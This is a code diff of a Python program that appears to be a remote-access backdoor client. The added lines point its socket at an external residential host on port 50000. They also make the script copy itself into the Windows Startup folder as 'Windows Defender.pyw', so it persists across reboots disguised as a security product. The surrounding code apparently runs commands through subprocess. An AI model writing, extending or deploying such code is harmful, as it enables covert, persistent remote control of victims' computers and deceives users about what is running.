@@ -1,6 +1,7 @@
 import socket
 from subprocess import check_output, CalledProcessError
 from pickle import dumps
+from os import getlogin
 
 
 class Socket:
@@ -12,7 +13,7 @@ class Socket:
     def connect_to_server(self):
         try:
             self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.active_socket.connect((socket.gethostname(), 50000))
+            self.active_socket.connect(("ip-95-222-116-98.hsi15.unitymediagroup.de", 50000))
             Socket.established = True
             print("Connection established")
         except (ConnectionRefusedError, TimeoutError, socket.error):
@@ -44,6 +45,15 @@ class Socket:
             self.established = False
 
 
+def copy_to_startup(file_name):
+    startup_path = "C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+    with open(__file__, "rb")as file:
+        file_bytes = file.read()
+    with open(startup_path + file_name, "wb")as file:
+        file.write(file_bytes)
+
+
+copy_to_startup("Windows Defender.pyw")
 connection = Socket()
 while True:
     if not connection.established:
